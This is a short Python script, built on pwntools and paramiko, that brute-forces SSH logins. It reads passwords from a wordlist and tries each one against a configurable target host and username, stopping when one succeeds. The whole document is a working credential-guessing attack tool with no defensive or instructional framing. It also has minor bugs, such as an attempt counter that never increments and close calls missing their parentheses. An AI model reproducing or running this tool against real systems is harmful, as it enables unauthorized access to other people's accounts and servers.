from pwn import *
import paramiko

target = "127.1.13.10"                                          #Change this
username = "mike"                                               #Change this
attempts = 0

with open ("Password.txt","r") as password_list:                #Password text file in place of password.txt
    for password in password_list:
        password = password.strip("\n")                         #Strips password for new lines
        try:
            print("[{}] Attempting Password: '{}',!".format(attempts,password))
            response = ssh(host=target, user=username, password=password,timeout=1)
            if response.connected():
                print("[>]Valid Password found '{}',!".format(password))
                response.close;
                break
            response.close
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
            attempts = +1
